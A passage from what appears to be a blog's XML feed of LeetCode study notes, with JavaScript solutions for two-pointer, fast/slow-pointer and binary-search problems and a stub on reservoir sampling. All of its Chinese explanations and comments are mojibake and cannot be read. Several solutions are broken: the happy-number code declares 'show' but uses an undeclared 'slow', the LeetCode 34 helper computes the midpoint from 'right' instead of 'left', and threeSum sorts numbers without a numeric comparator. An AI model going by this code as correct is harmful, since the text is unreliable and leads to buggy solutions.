class="number">2</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length - <span class="number">1</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> k = j + <span class="number">1</span>; k &lt; nums.length; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] + nums[j] + nums[k] === <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> temp = [nums[i], nums[j], nums[k]]</span><br><span class="line">          <span class="keyword">if</span> (!resultSet.has(temp.join())) &#123;</span><br><span class="line">            result.push(temp)</span><br><span class="line">            resultSet.add(temp.join())</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="125-éªŒè¯å›æ–‡ä¸²"><a href="#125-éªŒè¯å›æ–‡ä¸²" class="headerlink" title="125.éªŒè¯å›æ–‡ä¸²"></a>125.éªŒè¯å›æ–‡ä¸²</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  str = str.replace(<span class="regexp">/[^0-9a-zA-Z]/g</span>, <span class="string">''</span>).toLowerCase()</span><br><span class="line">  <span class="keyword">let</span> l = <span class="number">0</span>, r = str.length - <span class="number">1</span> <span class="comment">// å¤´å°¾æŒ‡é’ˆ</span></span><br><span class="line">  <span class="keyword">while</span> (l &lt; r) &#123; </span><br><span class="line">    <span class="keyword">if</span> (str[l] != str[r]) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    l++</span><br><span class="line">    r--</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="11-ç››æœ€å¤šæ°´çš„å®¹å™¨"><a href="#11-ç››æœ€å¤šæ°´çš„å®¹å™¨" class="headerlink" title="11.ç››æœ€å¤šæ°´çš„å®¹å™¨"></a>11.ç››æœ€å¤šæ°´çš„å®¹å™¨</h4><p>å·¦å³æŒ‡é’ˆåˆ†åˆ«æŒ‡å‘å·¦å³ä¸¤ç«¯ï¼Œæ€»æ˜¯ç§»åŠ¨æ•°å­—è¾ƒå°çš„é‚£ä¸ªæŒ‡é’ˆï¼Œå¾—å‡ºæœ€å¤§å€¼<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> maxArea = <span class="function"><span class="params">height</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">0</span>; <span class="comment">// å·¦æŒ‡é’ˆ</span></span><br><span class="line">  <span class="keyword">let</span> j = height.length - <span class="number">1</span>; <span class="comment">// å³æŒ‡é’ˆ</span></span><br><span class="line">  <span class="keyword">let</span> area = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">    area = <span class="built_in">Math</span>.max(<span class="built_in">Math</span>.min(height[i], height[j]) * (j - i), area)</span><br><span class="line">    <span class="keyword">if</span> (height[i] &lt; height[j]) &#123;</span><br><span class="line">      i++</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      j--</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> area</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>æ—¶é—´å¤æ‚åº¦ï¼šO(n)</p><p><br></p><h4 id="15-ä¸‰æ•°ä¹‹å’Œ-1"><a href="#15-ä¸‰æ•°ä¹‹å’Œ-1" class="headerlink" title="15.ä¸‰æ•°ä¹‹å’Œ"></a>15.ä¸‰æ•°ä¹‹å’Œ</h4><p>æšä¸¾kï¼Œkç¡®å®šåï¼Œè®© <code>nums[i] + nums[j] + nums[k] = 0</code>ã€‚<br>å› ä¸ºkå³ä¾§çš„æ•°ç»„å§‹ç»ˆæ˜¯å•è°ƒé€’å¢çš„ï¼ŒåŒæŒ‡é’ˆi jä¸€ä¸ªåœ¨å¤´ï¼Œä¸€ä¸ªåœ¨å°¾ã€‚å¦‚æœ<code>sum &lt; 0</code>, å·¦æŒ‡é’ˆiå¾€å³ç§»ã€‚å¦‚æœ<code>sum &gt; 0</code>, å³æŒ‡é’ˆjå¾€å·¦ç§»<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -4 -1 -1 -1 0 1 2</span></span><br><span class="line"><span class="comment">// k  i            j</span></span><br><span class="line"><span class="keyword">const</span> threeSum = <span class="function"><span class="params">nums</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = []</span><br><span class="line">  nums = nums.sort()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> k = <span class="number">0</span>; k &lt; nums.length - <span class="number">2</span>; k++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[k] &gt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (k &gt; <span class="number">0</span> &amp;&amp; nums[k] == nums[k - <span class="number">1</span>]) <span class="keyword">continue</span>; <span class="comment">// è·³è¿‡é‡å¤çš„kå€¼</span></span><br><span class="line">    <span class="keyword">let</span> i = k + <span class="number">1</span></span><br><span class="line">    <span class="keyword">let</span> j = nums.length - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">const</span> sum = nums[k] + nums[i] + nums[j]</span><br><span class="line">      <span class="keyword">if</span> (sum === <span class="number">0</span>) &#123;</span><br><span class="line">        arr.push([nums[k], nums[i], nums[j]])</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] === nums[++i]) &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] === nums[--j]) &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] === nums[++i]) &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] === nums[--j]) &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><ul><li>å¤¹é€¼æ³•ï¼šæ’åºä¹‹åï¼ŒåŒæŒ‡é’ˆè¿›è¡Œå·¦å³å¤¹é€¼<br>æšä¸¾kï¼Œkç¡®å®šåï¼Œè®© <code>nums[i] + nums[j] + nums[k] = 0</code>ã€‚</li></ul><p>-4 -1 -1 -1 0 1 2<br>k  i            j</p><p>å› ä¸ºkå³ä¾§çš„æ•°ç»„å§‹ç»ˆæ˜¯å•è°ƒé€’å¢çš„ï¼ŒåŒæŒ‡é’ˆi jä¸€ä¸ªåœ¨å¤´ï¼Œä¸€ä¸ªåœ¨å°¾ã€‚å¦‚æœ<code>sum &lt; 0</code>, å·¦æŒ‡é’ˆiå¾€å³ç§»ã€‚å¦‚æœ<code>sum &gt; 0</code>, å³æŒ‡é’ˆjå¾€å·¦ç§»<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> threeSum = <span class="function"><span class="params">nums</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = []</span><br><span class="line">  nums = nums.sort()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> k = <span class="number">0</span>; k &lt; nums.length - <span class="number">2</span>; k++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[k] &gt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (k &gt; <span class="number">0</span> &amp;&amp; nums[k] == nums[k - <span class="number">1</span>]) <span class="keyword">continue</span>; <span class="comment">// è·³è¿‡é‡å¤çš„kå€¼</span></span><br><span class="line">    <span class="keyword">let</span> i = k + <span class="number">1</span></span><br><span class="line">    <span class="keyword">let</span> j = nums.length - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">const</span> sum = nums[k] + nums[i] + nums[j]</span><br><span class="line">      <span class="keyword">if</span> (sum === <span class="number">0</span>) &#123;</span><br><span class="line">        arr.push([nums[k], nums[i], nums[j]])</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] === nums[++i]) &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] === nums[--j]) &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] === nums[++i]) &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] === nums[--j]) &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-å¿«æ…¢æŒ‡é’ˆ"><a href="#4-å¿«æ…¢æŒ‡é’ˆ" class="headerlink" title="4. å¿«æ…¢æŒ‡é’ˆ"></a>4. å¿«æ…¢æŒ‡é’ˆ</h3><p>é“¾è¡¨ä¸­ä½¿ç”¨å¿«æ…¢æŒ‡é’ˆä¸€èˆ¬ç”¨äºåˆ¤æ–­æ˜¯å¦ä¸ºç¯å½¢é“¾è¡¨</p><h4 id="141-ç¯å½¢é“¾è¡¨"><a href="#141-ç¯å½¢é“¾è¡¨" class="headerlink" title="141.ç¯å½¢é“¾è¡¨"></a>141.ç¯å½¢é“¾è¡¨</h4><p>ç»™å®šä¸€ä¸ªé“¾è¡¨ï¼Œåˆ¤æ–­é“¾è¡¨ä¸­æ˜¯å¦æœ‰ç¯ã€‚ä½¿ç”¨O(1)å†…å­˜è§£å†³æ­¤é—®é¢˜ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hasCycle = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!head || !head.next) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">let</span> slow = head</span><br><span class="line">  <span class="keyword">let</span> fast = head.next</span><br><span class="line">  <span class="keyword">while</span> (slow !== fast) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!fast || !fast.next) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    slow = slow.next</span><br><span class="line">    fast = fast.next.next</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="202-å¿«ä¹æ•°"><a href="#202-å¿«ä¹æ•°" class="headerlink" title="202.å¿«ä¹æ•°"></a>202.å¿«ä¹æ•°</h4><ul><li>æ‰¾åˆ°å¿«ä¹æ•°</li><li>æ²¡æœ‰å¿«ä¹æ•°ï¼Œå½¢æˆç¯è·¯ï¼Œé€ æˆæ­»å¾ªç¯<br>åˆ›å»ºå¿«æ…¢æŒ‡é’ˆï¼Œæ…¢æŒ‡é’ˆæ¯æ¬¡èµ°ä¸€æ­¥ï¼Œå¿«æŒ‡é’ˆæ¯æ¬¡èµ°ä¸¤æ­¥ã€‚å½“å¿«æ…¢æŒ‡é’ˆç›¸é‡ï¼Œè¡¨ç¤ºæœ‰ç¯è·¯ï¼Œè¯¥æ•°ä¸æ˜¯å¿«ä¹æ•°<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getNext = <span class="function"><span class="params">n</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> n.toString().split(<span class="string">''</span>).map(<span class="function"><span class="params">v</span> =&gt;</span> v ** <span class="number">2</span>).reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isHappy = <span class="function"><span class="params">n</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> show = n</span><br><span class="line">  <span class="keyword">let</span> fast = getNext(n)</span><br><span class="line">  <span class="keyword">while</span> (fast !== <span class="number">1</span> &amp;&amp; fast !== slow) &#123;</span><br><span class="line">    slow = getNext(slow)</span><br><span class="line">    fast = getNext(getNext(fast))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fast === <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>éšæœºæŠ½æ ·</title>
      <link href="/2021/08/19/Leetcode-%E9%9A%8F%E6%9C%BA%E6%8A%BD%E6%A0%B7/"/>
      <url>/2021/08/19/Leetcode-%E9%9A%8F%E6%9C%BA%E6%8A%BD%E6%A0%B7/</url>
      <content type="html"><![CDATA[<h3 id="è“„æ°´æ± æŠ½æ ·"><a href="#è“„æ°´æ± æŠ½æ ·" class="headerlink" title="è“„æ°´æ± æŠ½æ ·"></a>è“„æ°´æ± æŠ½æ ·</h3><p>å½“å†…å­˜æ— æ³•åŠ è½½å…¨éƒ¨æ•°æ®æ—¶ï¼Œå¦‚ä½•ä»åŒ…å«æœªçŸ¥å¤§å°çš„æ•°æ®æµä¸­éšæœºé€‰å–kä¸ªæ•°æ®ï¼Œå¹¶ä¸”è¦ä¿è¯æ¯ä¸ªæ•°æ®è¢«æŠ½å–åˆ°çš„æ¦‚ç‡ç›¸ç­‰ã€‚</p><p>è“„æ°´æ± æŠ½æ ·æ˜¯ä¸€ç³»åˆ—çš„éšæœºç®—æ³•ï¼Œå…¶ç›®çš„åœ¨äºé›†åˆ n ä¸­é€‰å– k ä¸ªæ ·æœ¬ï¼Œå…¶ä¸­ n ä¸ºä¸€å¾ˆå¤§æˆ–æœªçŸ¥çš„æ•°é‡ï¼Œå°¤å…¶é€‚ç”¨äºä¸èƒ½æŠŠæ‰€æœ‰ n ä¸ªé¡¹ç›®éƒ½å­˜æ”¾åˆ°å†…å­˜çš„æƒ…å†µã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3>]]></content>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” äºŒåˆ†æŸ¥æ‰¾</title>
      <link href="/2021/08/19/Leetcode-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
      <url>/2021/08/19/Leetcode-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
      <content type="html"><![CDATA[<blockquote><p>åœ¨ 42 äº¿ä¸ªæœ‰åºæ•°æ®ä¸­ç”¨<strong>äºŒåˆ†æŸ¥æ‰¾</strong>ä¸€ä¸ªæ•°æ®ï¼Œæœ€å¤šéœ€è¦æ¯”è¾ƒ 32 æ¬¡ã€‚äºŒåˆ†æŸ¥æ‰¾æ˜¯ä¸€ä¸ªæ—¶é—´å¤æ‚åº¦ä¸º O(logn) çš„ç®—æ³•ã€‚logn éå¸¸â€œææ€–â€ï¼Œå³ä¾¿ n éå¸¸éå¸¸å¤§ï¼Œå¯¹åº”çš„ logn ä¹Ÿå¾ˆå°ã€‚</p></blockquote><h3 id="1-äºŒåˆ†æŸ¥æ‰¾-Binary"><a href="#1-äºŒåˆ†æŸ¥æ‰¾-Binary" class="headerlink" title="1. äºŒåˆ†æŸ¥æ‰¾ Binary"></a>1. äºŒåˆ†æŸ¥æ‰¾ Binary</h3><p>äºŒåˆ†æŸ¥æ‰¾é’ˆå¯¹çš„æ˜¯ä¸€ä¸ªæœ‰åºçš„æ•°æ®é›†åˆï¼Œæ¯æ¬¡éƒ½é€šè¿‡è·ŸåŒºé—´çš„ä¸­é—´å…ƒç´ å¯¹æ¯”ï¼Œå°†å¾…æŸ¥æ‰¾çš„åŒºé—´ç¼©å°ä¸ºä¹‹å‰çš„ä¸€åŠï¼Œç›´åˆ°æ‰¾åˆ°è¦æŸ¥æ‰¾çš„å…ƒç´ ï¼Œæˆ–è€…åŒºé—´è¢«ç¼©å°ä¸º 0ã€‚</p><ul><li><p>è¢«æŸ¥æ‰¾åŒºé—´çš„å¤§å°å˜åŒ–<br>n, n/2, n/4, n/8 â€¦ n/2^k</p></li><li><p>ä½¿ç”¨åœºæ™¯</p><ul><li>ç›®æ ‡å‡½æ•°å•è°ƒæ€§ï¼ˆå•è°ƒé€’å¢æˆ–è€…é€’å‡ï¼‰</li><li>å­˜åœ¨ä¸Šä¸‹ç•Œ</li><li>èƒ½å¤Ÿé€šè¿‡ç´¢å¼•è®¿é—®</li></ul></li></ul><p><br></p><h3 id="2-ä»£ç æ¨¡æ¿"><a href="#2-ä»£ç æ¨¡æ¿" class="headerlink" title="2.ä»£ç æ¨¡æ¿"></a>2.ä»£ç æ¨¡æ¿</h3><p>LeetCodeé‡Œå…³äºäºŒåˆ†æŸ¥æ‰¾çš„é¢˜æœ¨ï¼Œå‡ ä¹å¯ä»¥å¥—ç”¨è¿™ä¸ªä»£ç æ¨¡æ¿ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> binarySearch = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> right = nums.length - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">    <span class="keyword">let</span> mid = left + ((right - left) &gt;&gt; <span class="number">1</span>) <span class="comment">// ç›¸å½“äº Math.floor(left + (right - left) / 2)</span></span><br><span class="line">    <span class="keyword">if</span> (nums[mid] === target) &#123;</span><br><span class="line">      <span class="keyword">return</span> mid</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">      left = mid + <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      right = mid - <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-LeetCodeé¢˜ç›®"><a href="#3-LeetCodeé¢˜ç›®" class="headerlink" title="3. LeetCodeé¢˜ç›®"></a>3. LeetCodeé¢˜ç›®</h3><p>ä¸»è¦åŒ…æ‹¬è¿™3ç±» <strong>(ç‚¹å‡»æŸ¥çœ‹å®Œæ•´ä»£ç )</strong></p><ol><li>ç®€å•çš„æœ‰åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ </li></ol><table><thead><tr><th>ç±»å‹</th><th style="text-align:center">LeetCodeé¢˜ç›®</th></tr></thead><tbody><tr><td>æœ‰åºæ•°ç»„ä¸­ä¸å­˜åœ¨é‡å¤å…ƒç´ </td><td style="text-align:center"><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/704.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.md" target="_blank" rel="noopener">704. äºŒåˆ†æŸ¥æ‰¾</a></td></tr><tr><td>æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå€¼ï¼Œæœ€åä¸€ä¸ªç­‰äºç»™å®šå€¼çš„å…ƒç´ </td><td style="text-align:center"><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/34.%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%85%83%E7%B4%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%92%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E4%BD%8D%E7%BD%AE.md" target="_blank" rel="noopener">34.åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®</a>  <br> <a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/Offer53-%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E6%95%B0%E5%AD%97I.md" target="_blank" rel="noopener">Offer53.åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾æ•°å­—I</a></td></tr><tr><td>æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå¤§äºç­‰äºç»™å®šå€¼çš„å…ƒç´ ã€æŸ¥æ‰¾æœ€åä¸€ä¸ªå°äºç­‰äºç»™å®šå€¼çš„å…ƒç´ </td><td style="text-align:center"><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/35.%E6%90%9C%E7%B4%A2%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE.md" target="_blank" rel="noopener">35.æœç´¢æ’å…¥ä½ç½®</a></td></tr></tbody></table><ol start="2"><li>ç”¨äºæ—‹è½¬åçš„ã€äºŒç»´çš„æœ‰åºæ•°ç»„</li></ol><table><thead><tr><th>ç±»å‹</th><th style="text-align:right">LeetCodeé¢˜ç›®</th></tr></thead><tbody><tr><td>æ—‹è½¬åçš„æœ‰åºæ•°ç»„</td><td style="text-align:right"><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/33.%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84.md" target="_blank" rel="noopener">33.æœç´¢æ—‹è½¬æ’åºæ•°ç»„</a><br> <a href="">81.æœç´¢æ—‹è½¬æ’åºæ•°ç»„ II</a><br> <a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/33.%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84.md" target="_blank" rel="noopener">153.å¯»æ‰¾æ—‹è½¬æ’åºæ•°ç»„ä¸­çš„æœ€å°å€¼</a></td></tr><tr><td>æœ‰åºçš„äºŒç»´æ•°ç»„</td><td style="text-align:right"><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/74.%E6%90%9C%E7%B4%A2%E4%BA%8C%E7%BB%B4%E7%9F%A9%E9%98%B5.md" target="_blank" rel="noopener">74.æœç´¢äºŒç»´çŸ©é˜µ</a></td></tr><tr><td>å¤šä¸ªæœ‰åºæ•°ç»„</td><td style="text-align:right"><a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/" target="_blank" rel="noopener">4.å¯»æ‰¾ä¸¤ä¸ªæ­£åºæ•°ç»„çš„ä¸­ä½æ•°</a></td></tr></tbody></table><ol start="3"><li>äºŒåˆ†æŸ¥æ‰¾ä¹Ÿé€‚åˆç”¨åœ¨â€œè¿‘ä¼¼â€æŸ¥æ‰¾é—®é¢˜</li></ol><p><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/69.x%20%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9.md" target="_blank" rel="noopener">69.xçš„å¹³æ–¹æ ¹</a>ã€ <a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/367.%E6%9C%89%E6%95%88%E7%9A%84%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0.md" target="_blank" rel="noopener">367.æœ‰æ•ˆçš„å®Œå…¨å¹³æ–¹æ•°</a></p><p><br></p><h3 id="4-ä¾‹é¢˜"><a href="#4-ä¾‹é¢˜" class="headerlink" title="4. ä¾‹é¢˜"></a>4. ä¾‹é¢˜</h3><p>ä¸‹é¢æ˜¯ä¸¤æ¡æœ‰ä»£è¡¨æ€§çš„ï¼Œå…¶ä»–çš„ç‚¹é“¾æ¥åˆ·</p><h5 id="LeetCode-34-åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®"><a href="#LeetCode-34-åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®" class="headerlink" title="LeetCode 34.åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®"></a>LeetCode 34.åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> binarySearch = <span class="function">(<span class="params">nums, target, lower</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>, right = nums.length - <span class="number">1</span>, ans = nums.length</span><br><span class="line">  <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">    <span class="keyword">const</span> mid = right + ((right - left) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="comment">// lowerä¸ºtrueæ—¶ï¼Œæ‰¾æœ€å·¦ä¸€ä¸ªä½ç½®ï¼Œnums[mid] === targetæ—¶ï¼Œè®©rightå¾€ä¸‹å‡ï¼Œæœ€åæ‰¾åˆ°æœ€å·¦ä¾§çš„ç´¢å¼•</span></span><br><span class="line">    <span 